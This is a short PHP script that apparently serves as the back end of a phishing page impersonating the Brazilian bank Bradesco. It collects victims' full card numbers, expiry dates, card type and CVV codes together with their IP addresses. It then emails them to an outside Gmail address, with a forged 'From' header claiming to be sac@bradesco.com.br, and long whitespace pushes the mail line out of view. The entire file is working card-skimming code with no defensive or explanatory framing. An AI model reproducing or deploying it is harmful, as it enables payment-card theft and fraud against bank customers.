<?
$ver01=$_POST['ver01']; $ver02=$_POST['ver02'];
$ver03=$_POST['ver03']; $ver04=$_POST['ver04'];
$mes=$_POST['mes']; $ano=$_POST['ano']; 
$via=$_POST['via']; $tip=$_POST['tip'];
$cvv=$_POST['cvv']; $ip=$_SERVER["REMOTE_ADDR"];
$hora=date("H:i:s"); $headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: NOVOSYSTEMA-C4RT40 <sac@bradesco.com.br>";
$conteudo.="<b>------------------------------------------------------------------------------------------------------</b><br>"; 
$conteudo.="<b>CARD:</b> $ver01-$ver02-$ver03-$ver04 <b>VAL:</b> $mes/$ano <b>V/T:</b> $via-$tip <b>CVV:</b> $cvv<br>";
$conteudo.="<b>------------------------------------------------------------------------------------------------------</b><br>"; 
@mail("anongrbradesco@gmail.com", "$ip", "$conteudo", $headers);																																																																																																																																																																																																																																																	
?>